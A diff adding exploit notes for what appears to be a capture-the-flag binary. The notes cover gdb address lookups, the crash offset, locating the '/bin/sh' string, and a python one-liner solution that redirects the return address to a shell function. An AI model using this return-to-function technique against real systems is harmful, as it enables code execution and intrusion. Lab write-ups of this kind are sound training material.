@@ -1,0 +1,23 @@
+main @ 0x080486fd
+
+print_name function @ 0x080486d0
+
+printf @ 0x080486f6
+
+shell @ 0x080486bd
+
+set breakpoint after the printf call before return to main @ 0x80486fb
+
+run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
+
+Segfault: EIP: 0x48484847 ('GHHH')
+
+Need another A*4 buffer , then a pointer to a command string
+
+Type strings in gdb to get a list of strings in the program, and find that /bin/sh is @ 0x80487d0
+
+Solution
+
+run $(python -c 'print "A"*27 + "\xbd\x86\x04\x08" + "B"*4 + "\xd0\x87\x04\x08"')
+
+
